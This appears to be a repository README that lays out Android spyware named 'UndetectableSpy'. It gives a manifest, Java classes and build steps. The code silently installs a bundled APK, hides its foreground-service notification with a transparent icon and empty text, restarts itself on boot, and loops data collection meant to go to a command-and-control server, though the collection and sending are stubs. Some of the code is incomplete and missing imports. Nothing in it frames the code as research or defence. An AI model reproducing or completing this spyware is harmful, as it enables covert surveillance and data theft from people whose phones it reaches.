# System-of-down
Ghost

## Project Structure
UndetectableSpy/
├── src/main/java/com/legitimate/
│   ├── UndetectableActivity.java
│   ├── UndetectableService.java
│   └── UndetectableReceiver.java
├── src/main/res/
│   └── drawable/
│       └── ic_legitimate.xml
└── AndroidManifest.xml

## AndroidManifest.xml
```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    
    <application>
        <activity android:name=".UndetectableActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        
        <service android:name=".UndetectableService"/>
        
        <receiver android:name=".UndetectableReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

## UndetectableActivity.java
```
package com.legitimate;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;

public class UndetectableActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Install silently
        installUndetectable();
        
        // Finish activity
        finish();
    }
    
    private void installUndetectable() {
        try {
            // Create temporary file
            File tempFile = new File(getCacheDir(), "legitimate.apk");
            copyAssetsToFiles(tempFile);
            
            // Use package manager to install silently
            PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            int sessionId = packageInstaller.createSession(params);
            
            // Write APK to session
            OutputStream out = packageInstaller.openWrite(
                "legitimate", 0, -1);
            FileInputStream fis = new FileInputStream(tempFile);
            byte[] buffer = new byte[65536];
            int c;
            while ((c = fis.read(buffer)) != -1) {
                out.write(buffer, 0, c);
            }
            fis.close();
            out.close();
            
            // Commit installation
            packageInstaller.commit(sessionId);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

## UndetectableService.java
```
package com.legitimate;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import android.support.v4.app.NotificationCompat;
import android.support.v4.app.NotificationManagerCompat;

public class UndetectableService extends Service {
    private static final int NOTIFICATION_ID = 1;
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Create notification channel with minimum importance
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "legitimate_channel", "Legitimate Channel", 
                NotificationManager.IMPORTANCE_MIN);
            NotificationManagerCompat.from(this).createNotificationChannel(channel);
        }
        
        // Use transparent icon to hide notification
        Notification notification = new NotificationCompat.Builder(this, "legitimate_channel")
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.color.transparent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build();
        
        // Start foreground service
        startForeground(NOTIFICATION_ID, notification);
        
        // Start collection in background
        new Thread(() -> {
            while(true) {
                try {
                    // Collect data
                    collectData();
                    
                    // Send to C2
                    sendToC2();
                    
                    // Sleep
                    Thread.sleep(60000);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }
        }).start();
        
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    private void collectData() {
        try {
            // Collect all data
            SharedPreferences prefs = getSharedPreferences("legitimate", MODE_PRIVATE);
            prefs.edit().putString("data", collectAllData()).apply();
        } catch (Exception e) {
            // Ignore
        }
    }
    
    private void sendToC2() {
        try {
            // Send to command-and-control server
        } catch (Exception e) {
            // Ignore
        }
    }
    
    private String collectAllData() {
        // Collect device data
        return "";
    }
}
```

## UndetectableReceiver.java
```
package com.legitimate;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.app.ActivityManager;

public class UndetectableReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if(Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            // Check if already running
            if (!isServiceRunning(context)) {
                // Start service
                context.startService(new Intent(context, UndetectableService.class));
            }
        }
    }
    
    private boolean isServiceRunning(Context context) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if ("com.legitimate.UndetectableService".equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
}
```

## Build Instructions

File -> New -> New Project -> Empty Activity
Copy all files into respective folders
Build -> Generate Signed Bundle / APK
